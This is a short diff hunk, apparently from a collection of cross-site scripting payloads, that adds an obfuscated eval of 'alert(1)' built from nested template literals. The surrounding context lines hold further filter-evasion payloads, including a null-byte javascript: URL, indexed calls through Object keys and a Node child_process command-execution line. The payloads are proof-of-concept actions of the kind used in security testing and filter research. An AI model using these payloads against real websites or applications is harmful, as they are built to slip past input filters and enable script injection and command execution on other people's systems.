@@ -331,3 +331,4 @@ top.require('child_process').execSync('open -a Calculator')
 this[Object["keys"](this)[146]](1)
 this[Object["keys"](this)[5]](1)
 location='javascript\u0000:alert()'
+eval(`${`${`${`${`${`a`}`}`}`}`}${`${`${`${`${`l`}`}`}`}`}${`${`${`${`${`e`}`}`}`}`}${`${`${`${`${`r`}`}`}`}`}${`${`${`${`${`t`}`}`}`}`}${`${`${`${`${`(1)`}`}`}`}`}`)
